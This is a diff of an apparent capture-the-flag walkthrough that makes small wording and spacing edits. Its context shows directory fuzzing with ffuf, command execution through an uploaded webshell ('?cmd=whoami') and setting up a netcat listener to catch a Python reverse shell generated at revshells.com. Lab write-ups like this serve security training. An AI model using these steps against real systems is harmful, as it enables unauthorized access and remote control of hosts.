@@ -21,7 +21,9 @@ The command we will use is:
 ffuf -u http://<room_ip>/FUZZ -w /home/Seclists/Discovery/Web-Content/common.txt
 ```
 
+
 ![ffuf result](ffuf_res.png)
+
 
 As we can see, the unusual directory name that matches the number of words required in the 5th question is a notable directory.
 
@@ -57,7 +59,7 @@ We will hit this URL: `http://<ip>/<upload_endpoint>?cmd=whoami`
 
 If we get any output back, we can now get a shell.
 
-Go to [revshells.com](https://revshells.com), copy the IP under your `tun0` interface and enter it there. On your local machine, set up the listener with `nc -lvnp 4444`, then copy and generate the simplest Python reverse shell command.
+Go to [revshells.com](https://revshells.com), copy the IP under your `tun0` interface and enter it there. On your local machine, set up the listener with `nc -lvnp 4444`, and under all types of shell select python simplest then copy and generate the simplest Python reverse shell command.
 
 When you hit this endpoint:
 ```
